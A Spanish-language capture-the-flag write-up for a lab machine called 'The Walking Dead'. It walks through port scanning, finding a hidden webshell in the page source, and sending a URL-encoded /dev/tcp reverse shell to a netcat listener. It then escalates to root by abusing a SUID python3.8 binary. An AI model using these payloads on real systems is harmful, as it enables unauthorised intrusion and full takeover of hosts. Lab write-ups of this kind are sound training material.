
## Escaneo de Puertos:

Usamos **nmap** para empezar a escanear los puertos a ver que **servicios** encontramos.
```bash
[23:54:26] bapee@BlumeSec ~ ❯ nmap -sVC -p- --open 172.17.0.2         
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-21 23:56 +0200
Nmap scan report for 172.17.0.2
Host is up (0.0000050s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0d:09:9d:0f:dc:43:54:cd:39:a9:e2:d6:81:74:40:e8 (RSA)
|   256 09:d0:f6:52:00:3f:21:51:19:b1:c6:7a:f4:ff:21:01 (ECDSA)
|_  256 19:e0:b3:72:bd:e9:1e:8d:4c:c4:fd:1f:da:3f:a5:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: The Walking Dead - CTF
MAC Address: CE:22:F2:82:E1:49 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.68 seconds
```

Vemos que tenemos **2** puertos, el **80** y el **22**, vamos a empezar analizando la web a ver que encontramos.

## Análisis de Puerto 80:

Usaremos **curl** para ver a detalle toda la información.
```bash
[0:02:09] bapee@BlumeSec ~ ❯ curl 172.17.0.2 | cat | tidy -jq
HTML Tidy: unknown option: j
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100   1380 100   1380   0      0 485.4k      0                              0
<!DOCTYPE html>
<html lang="es">
<head>
<meta name="generator" content=
"HTML Tidy for HTML5 for Linux version 5.8.0">
<meta charset="UTF-8">
<title>The Walking Dead - CTF</title>

<style>
         body {             background-color: black;             color: red;             font-family: 'Courier New', monospace;             text-align: center;             margin: 0;             padding: 0;             height: 100vh;             display: flex;             flex-direction: column;             justify-content: center;             align-items: center;         }         h1 {             font-size: 50px;             text-shadow: 3px 3px 10px darkred;         }         p {             font-size: 20px;         }         .blood-drip {             font-size: 25px;             text-shadow: 3px 3px 10px darkred;             animation: blink 1s infinite alternate;         }         @keyframes blink {             from { opacity: 1; }             to { opacity: 0.5; }         }         audio {             margin-top: 20px;         }         .hidden-link {             display: none;         }     
</style>
</head>
<body>
<h1>The Walking Dead - CTF</h1>
<p class="blood-drip">Survive... if you can.</p>
<audio autoplay="" loop=""><source src="walking_dead_theme.mp3"
type="audio/mpeg"> Tu navegador no soporta el audio.</audio>
<p class="hidden-link"><a href="hidden/.shell.php">Access
Panel</a></p>
</body>
</html>
```

Vemos algo MUY interesante, ```<a href="hidden/.shell.php">``` , esto es una shell que posiblemente funcione de manera interactiva con el servidor, en estos casos suele ser con el usuario **www-data**.

Ahora vamos a probar la **shell**, pero antes vamos a usar **gobuster** para ver si hay algo mas que nos pueda ser útil.

```bash
[0:02:16] bapee@BlumeSec ~ ❯ gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -b 404,403
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404,403
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html           (Status: 200) [Size: 1380]
backup.txt           (Status: 200) [Size: 53]
hidden               (Status: 301) [Size: 309] [--> http://172.17.0.2/hidden/]
Progress: 882232 / 882232 (100.00%)
```

Encontramos estos archivos, pero en backup.txt no hay nada y **hidden** no muestra nada ya que la **shell** esta oculta.

Al ya tener la ruta vamos directos a abusar de la **shell**.

## Shell desde la Web:

Empezaremos probando que funciona.
```bash
[0:10:38] bapee@BlumeSec ~ ❯ curl "http://172.17.0.2/hidden/.shell.php?cmd=id" 
uid=33(www-data) gid=33(www-data) groups=33(www-data)

[0:12:19] bapee@BlumeSec ~ ❯ curl "http://172.17.0.2/hidden/.shell.php?cmd=pwd"
/var/www/html/hidden
```

Ahora una vez visto esto, es hora den intentar recibir la shell utilizando netcat, para eso pondremos un puerto en escucha "**4444**" y configuraremos una **Reverse Shell** **URL-Encodeada** para poder hacerlo.

Terminal #1
```bash
[0:12:22] bapee@BlumeSec ~ ❯ nc -lvnp 4444
```

Terminal #2
```bash
[0:12:24] bapee@BlumeSec ~ ❯ curl "http://172.17.0.2/hidden/.shell.php?cmd=bash%20-c%20%22sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F4444%200%3E%261%22"
```

Una vez hecho esto, en el **"Terminal #1"**, se nos habra generado la shell, para comprobar que este bien usamos el comando **"id"**.
```bash
[0:17:00] bapee@BlumeSec ~/twd ❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 33532
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Ahora que ya estamos dentro, vamos a escalar para conseguir el **usuario root**.

## Escalada a Root:

Hay muchas maneras de buscar una escalada a **"root"**, nosotros vamos a probar las que se suelen usar par ver que encontramos.

```bash
$ sudo -l
sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
```
Descartamos **sudo -l**.

```
$ getcap -r / 2>/dev/null
```
Tambien **getcap**.

```bash
$ find / -perm -4000 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/man
/usr/bin/passwd
/usr/bin/python3.8
/usr/bin/sudo
```
Interesante, hemos encontrado algo interesante, dentro del los **binarios SUID**, esta **"/usr/bin/python3.8"**.

Visto esto, vamos a buscar que maneras hay para poder **escalar** con este **binario**, aunque os voy adelantando que es usando de la **librería** tan famosa de Python llamada **"os"**.

```bash
$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'   
whoami
root
```

Y con este comando abusamos del SUID **"/usr/bin/python3.8"**, utilizando la libreria os 
```import os;``` nos permite colocarnos con **uid=0(root)** usando ```os.setuid(0);```, y para terminas con ```os.system("/bin/bash")```, llamariamos a la shell pero en este caso siendo root gracais al
```os.setuid(0);```.

De esta manera quedaría vulnerada la maquina **The Walking Dead!**

# Conclusión del ataque:
---
### Resumen de la ruta de ataque  
  
La máquina se ha comprometido completamente siguiendo una cadena de explotación basada en enumeración de servicios, descubrimiento de información oculta en la web, obtención de shell remota mediante RCE y escalada de privilegios mediante abuso de binarios SUID. El recorrido ha sido el siguiente:  
  
---  
### 1. Enumeración inicial  
Descubrimiento de puertos abiertos mediante `nmap`:  
  
- **22/tcp (SSH)**  
- **80/tcp (HTTP - Apache)**  
  
---  
### 2. Análisis del servicio web  
Acceso al servicio HTTP donde se identifica una página temática de *The Walking Dead - CTF*.  
  
Mediante `curl` se analiza el contenido HTML, descubriendo:  
  
- Mensaje oculto en la página  
- Recurso oculto: ```hidden/.shell.php```

---  
### 3. Enumeración web adicional  
Uso de `gobuster` para descubrir rutas adicionales:  
  
- `/index.html`  
- `/backup.txt`  
- `/hidden/`  
  
Se confirma la existencia del directorio oculto donde reside una **webshell**.  
  
---  
### 4. Acceso a webshell  
Se comprueba ejecución remota de comandos:  
  
- `cmd=id` → ejecución correcta como `www-data`  
- `cmd=pwd` → validación de ruta del sistema  
  
Esto confirma la existencia de una **RCE funcional vía GET parameter**.  
  
---   
### 5. Obtención de shell inversa  
Se establece listener con `netcat`:  
  
- Puerto: **4444**  
  
Se ejecuta payload URL-encoded para obtener reverse shell:  
  
- Acceso exitoso como:  
- `www-data`  
  
---  
### 6. Enumeración del sistema  
Una vez dentro del sistema se realizan comprobaciones de escalada:  
  
- `sudo -l` → no usable sin password  
- `getcap` → sin resultados útiles  
- `SUID binaries` → descubrimiento crítico  
  
Se detecta:  
  
- `/usr/bin/python3.8` con bit SUID activado  
  
---  
### 7. Escalada de privilegios  
Se abusa del binario Python con permisos SUID para ejecutar código como root:  
  
```bash  
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```